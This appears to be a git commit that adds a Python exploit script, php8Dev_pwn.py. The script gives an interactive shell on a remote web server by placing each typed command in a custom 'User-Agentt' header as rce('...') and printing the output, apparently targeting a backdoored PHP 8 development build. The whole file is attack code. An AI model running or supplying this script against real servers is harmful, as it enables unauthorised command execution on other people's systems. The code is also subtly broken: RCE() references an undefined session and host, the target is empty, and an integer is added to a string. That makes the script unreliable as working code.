e8b8c17f8868b67056c0f2c820132bbda04428ec
0cool <41885004+0cool-design@users.noreply.github.com>
2022-04-25 02:11:33 +0400

    Add files via upload

---
+++ php8Dev_pwn.py
@@ -0,0 +1,46 @@
+#!/usr/bin/env python3
+import os
+import re
+import requests
+
+
+def send_request(host):
+    request = requests.Session()
+    response = request.get(host)
+
+    if str(response) == '<Response [200]>':
+        print("\n [+] === Host is up ===")
+    else:
+        print("\r")
+        print(response)
+        print("[!] can't connect")
+        exit
+
+def RCE(CMD):
+        try:
+            headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
+            "User-Agentt": "rce('" + CMD + "');",
+            "Cookie": "vo1734te=1734",
+            "X-Requested-With": "XMLHttpRequest",
+            
+            }
+            response = request.get(host, headers = headers, allow_redirects = False)
+            current_page = response.text
+            stdout = current_page.split('<!DOCTYPE html>',1)
+            text = print(stdout[0])
+        except KeyboardInterrupt:
+            exit
+
+
+def main():
+    host = "" #host
+    send_request(host)
+    CMD = 1
+    while True:
+        CMD = input("$ ")
+        RCE(CMD)
+        CMD +=1
+
+if __name__ == "__main__":
+	main()
